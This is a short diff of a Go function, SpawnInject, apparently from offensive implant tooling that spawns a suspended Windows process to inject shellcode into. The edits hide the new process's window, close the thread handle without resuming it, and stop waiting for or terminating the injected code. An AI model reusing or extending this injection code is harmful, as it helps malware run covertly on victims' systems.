@@ -370,7 +370,7 @@ func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
 	si.Cb = uint32(unsafe.Sizeof(*si))
 	si.Flags = windows.STARTF_USESHOWWINDOW
 	pi := new(windows.ProcessInformation)
-	err = windows.CreateProcess(nil, arg0, nil, nil, false, windows.CREATE_NEW_CONSOLE|windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, si, pi)
+	err = windows.CreateProcess(nil, arg0, nil, nil, false, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, si, pi)
 	if err != nil {
 		return "", err
 	}
@@ -394,12 +394,14 @@ func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	windows.ResumeThread(windows.Handle(pi.Thread))
+	windows.CloseHandle(pi.Thread)
 	windows.CloseHandle(pi.Process)
-	go func() {
+	/* dont wait for code to end.
+	(go func() {
 		windows.WaitForSingleObject(windows.Handle(pi.Thread), windows.INFINITE)
 		windows.TerminateProcess(pi.Process, 0)
 	}()
+	*/
 	return fmt.Sprintf("[+] Success Created PID %s", pidStr), nil
 }
 
